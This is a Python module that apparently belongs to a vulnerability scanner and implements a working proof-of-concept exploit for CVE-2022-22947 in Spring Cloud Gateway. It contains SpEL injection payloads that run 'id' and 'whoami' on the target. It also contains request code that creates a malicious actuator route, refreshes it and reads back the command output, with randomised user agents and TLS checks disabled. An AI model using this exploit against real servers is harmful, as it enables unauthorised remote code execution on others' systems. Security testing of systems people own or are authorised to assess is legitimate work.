# coding:utf-8

import json
import requests

from util import RandomUA

class CVE_2022_22947:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua1 = ua.UserAgent()
        self.ua2 = ua.UserAgent()
        self.headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': self.ua1,
            'Content-Type': 'application/json'
        }

        self.headers2 = {
            'User-Agent': self.ua2,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.payload = '''{\r
                      "id": "hacktest",\r
                      "filters": [{\r
                        "name": "AddResponseHeader",\r
                        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
                        }],\r
                      "uri": "http://example.com",\r
                      "order": 0\r
                    }'''

        self.payload2 = '''{\r
                      "id": "hacktest",\r
                      "filters": [{\r
                        "name": "AddResponseHeader",\r
                        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"}\r
                        }],\r
                      "uri": "http://example.com",\r
                      "order": 0\r
                    }'''
    def poc(self,url,proxies,ProxyStute):
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        try:
            requests.packages.urllib3.disable_warnings()

            re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=self.payload, headers=self.headers1, json=json,
                                    verify=False, proxies=proxies)
            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=self.headers2, verify=False, proxies=proxies)
            re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=self.headers2, verify=False,
                                   proxies=proxies)

            if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
                reslut = f"[-] {url} Payload已经输出，回显结果如下"
                reslut1 = re3.text + "\n"
                return reslut + reslut1
            else:
                reslut = f"[-] {url} CVE-2022-22947漏洞不存在"
                return reslut
        except Exception as e:
            error = f"[error] {url} 未知错误 {e}"
            return error
    def exp(self,url,proxies,ProxyStute):
        pass